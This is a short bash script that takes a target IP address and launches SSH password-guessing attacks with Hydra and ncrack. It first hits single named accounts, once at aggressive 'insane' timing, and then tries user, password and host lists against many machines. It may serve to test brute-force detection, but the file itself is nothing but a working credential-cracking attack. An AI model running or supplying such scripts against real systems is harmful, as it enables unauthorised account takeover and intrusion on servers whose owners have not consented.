#!/bin/bash

if [ ! -n "$1" ]
then
  echo "Usage: `basename $0` target_ip_addr"
  exit 1
fi

# Try to crack single user on single host with Hydra
echo "Hydra: SSH, 1 user, 1 host..."
hydra -ljdoe -P passcrack/passlist $1 ssh

echo "Waiting 30 seconds..."
sleep 30

# Try to crack SSH single user on single host, hitting the hell out of it with
# ncrack
echo "Ncrack: SSH, 1 user, 1 host, hit hard..."
ncrack --user christjo -P passcrack/passlist_long -T insane $1 -p22

echo "Waiting 30 seconds..."
sleep 30

# Try to crack multiple users on multiple hosts with Hydra
echo "Hydra: SSH, many users, many hosts..."
hydra -L passcrack/userlist -P passcrack/passlist -M passcrack/hostlist ssh
